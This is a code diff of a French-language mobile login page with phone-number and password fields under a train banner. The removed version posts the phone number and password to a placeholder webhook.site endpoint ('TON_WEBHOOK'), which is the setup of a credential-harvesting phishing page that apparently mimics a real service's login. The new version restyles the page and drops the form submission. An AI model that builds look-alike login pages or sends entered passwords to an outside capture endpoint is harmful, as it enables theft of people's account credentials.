@@ -2,148 +2,148 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Connexion</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       font-family: Arial, sans-serif;
-      background-color: #f2f2f2;
+      background: #f2f2f2;
     }
 
+    /* SECTION IMAGE EN HAUT */
     .header-image {
-      width: 100%;
-      height: 260px;
-      background-image: url("train.jpg");
-      background-size: cover;
-      background-position: center;
       position: relative;
+      width: 100%;
+      height: 260px; /* Hauteur exacte inspirée de la capture */
+      background: url('train_cut.jpg') no-repeat center center;
+      background-size: cover;
     }
 
-    .switch {
+    /* BOUTONS PAR DESSUS L’IMAGE */
+    .toggle-buttons {
       position: absolute;
-      top: 200px;
+      bottom: -25px; /* Descend légèrement les boutons pour coller au formulaire */
       left: 50%;
       transform: translateX(-50%);
       display: flex;
-      background-color: white;
-      border-radius: 50px;
+      border-radius: 30px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
       overflow: hidden;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-      z-index: 2;
-      width: 300px; /* Rétréci */
     }
 
-    .switch button {
-      flex: 1;
-      padding: 12px 0;
+    .toggle-buttons button {
+      padding: 12px 22px;
       border: none;
-      outline: none;
+      cursor: pointer;
       font-weight: bold;
       font-size: 16px;
-      cursor: pointer;
     }
 
-    .switch button.active {
-      background-color: black;
+    .toggle-buttons .active {
+      background: black;
       color: white;
     }
 
-    .container {
-      margin-top: 60px; /* Plus d'espace entre image et formulaire */
-      background-color: white;
-      border-radius: 25px;
+    .toggle-buttons .inactive {
+      background: white;
+      color: black;
+    }
+
+    /* FORMULAIRE */
+    .form-container {
+      margin-top: 50px;
+      background: white;
       padding: 30px 20px;
-      width: 90%;
+      border-radius: 20px;
       max-width: 400px;
       margin-left: auto;
       margin-right: auto;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
     }
 
     .form-group {
       display: flex;
       align-items: center;
-      margin-bottom: 20px;
       border-bottom: 1px solid #ccc;
-      padding-bottom: 5px;
+      margin-bottom: 20px;
+      padding-bottom: 8px;
     }
 
-    .form-group i {
-      margin-right: 10px;
-    }
-
-    input[type="text"],
-    input[type="password"] {
+    .form-group input {
       border: none;
       outline: none;
-      flex: 1;
+      width: 100%;
+      margin-left: 10px;
       font-size: 16px;
     }
 
-    .country-code {
-      border: none;
-      background: transparent;
-      font-size: 16px;
-      margin-right: 10px;
-      cursor: pointer;
+    .form-group img {
+      width: 20px;
     }
 
-    .remember {
+    .checkbox {
       margin-bottom: 20px;
     }
 
-    .remember label {
-      margin-left: 5px;
-    }
-
-    .btn {
-      background-color: #f44320;
-      color: white;
-      border: none;
+    .submit-btn {
       width: 100%;
-      padding: 15px;
-      border-radius: 12px;
+      padding: 14px;
+      background: #e53914;
+      border: none;
+      color: white;
       font-weight: bold;
       font-size: 16px;
+      border-radius: 10px;
       cursor: pointer;
-      box-shadow: 0 4px 10px rgba(244, 67, 32, 0.3);
+    }
+
+    /* RESPONSIVE */
+    @media (max-width: 500px) {
+      .form-container {
+        margin-top: 50px;
+        border-radius: 20px;
+        padding: 25px 15px;
+      }
+
+      .toggle-buttons button {
+        padding: 10px 18px;
+        font-size: 14px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="header-image"></div>
 
-  <div class="switch">
-    <button class="active">Se connecter</button>
-    <button>Créer un compte</button>
+  <!-- IMAGE + BOUTONS -->
+  <div class="header-image">
+    <div class="toggle-buttons">
+      <button class="active">Se connecter</button>
+      <button class="inactive">Créer un compte</button>
+    </div>
   </div>
 
-  <div class="container">
-    <form action="https://webhook.site/TON_WEBHOOK" method="POST">
-      <div class="form-group">
-        <span>📱</span>
-        <select class="country-code" name="countryCode">
-          <option value="+237">+237</option>
-          <option value="+33">+33</option>
-          <option value="+225">+225</option>
-          <!-- ajoute d'autres si besoin -->
-        </select>
-        <input type="text" name="phone" placeholder="Entrez votre numéro de portable" required />
-      </div>
-
-      <div class="form-group">
-        <span>🔒</span>
-        <input type="password" name="password" placeholder="Veuillez entrer votre mot de passe" required />
-      </div>
-
-      <div class="remember">
-        <input type="checkbox" name="remember" id="remember" />
-        <label for="remember">Se souvenir du mot de passe</label>
-      </div>
-
-      <button type="submit" class="btn">Connectez-vous à votre compte</button>
-    </form>
+  <!-- FORMULAIRE -->
+  <div class="form-container">
+    <div class="form-group">
+      <img src="https://img.icons8.com/ios-filled/50/phone.png" alt="phone" />
+      <span style="margin-right: 10px;">+237</span>
+      <input type="tel" placeholder="Entrez votre numéro de portable" />
+    </div>
+    <div class="form-group">
+      <img src="https://img.icons8.com/ios-filled/50/lock.png" alt="lock" />
+      <input type="password" placeholder="Veuillez entrer votre mot de passe" />
+    </div>
+    <div class="checkbox">
+      <input type="checkbox" id="remember" />
+      <label for="remember">Se souvenir du mot de passe</label>
+    </div>
+    <button class="submit-btn">Connectez-vous à votre compte</button>
   </div>
+
 </body>
-          </html>
+</html>
